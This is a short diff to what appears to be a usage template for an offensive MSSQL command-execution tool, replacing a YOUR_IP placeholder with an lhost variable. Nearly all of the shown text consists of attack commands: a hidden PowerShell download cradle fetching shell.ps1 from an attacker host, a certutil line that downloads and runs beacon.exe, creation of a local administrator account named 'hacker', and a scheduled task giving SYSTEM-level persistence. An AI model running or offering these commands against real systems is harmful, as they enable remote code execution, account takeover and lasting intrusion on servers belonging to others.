@@ -66,13 +66,13 @@ output:
     Import-Module PowerUpSQL; Get-SQLInstanceBroadcast
 
     Execute Commands:
-    {{ output_file }} {{ mssql_server }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
+    {{ output_file }} {{ mssql_server }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/shell.ps1')"
 
     Example - Add Local Admin:
     {{ output_file }} {{ mssql_server }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
 
     Example - Download and Execute:
-    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://YOUR_IP/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe"
+    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://{{ lhost }}/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe"
 
     Example - Persistence:
     {{ output_file }} {{ mssql_server }} "schtasks /create /tn Update /tr C:\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"
@@ -97,4 +97,4 @@ output:
     - Consider linked server enumeration: `SELECT * FROM sys.servers WHERE is_linked = 1`
 
     Cleanup:
-    Remove-Item {{ output_file }} -Force
+    $ Remove-Item {{ output_file }} -Force
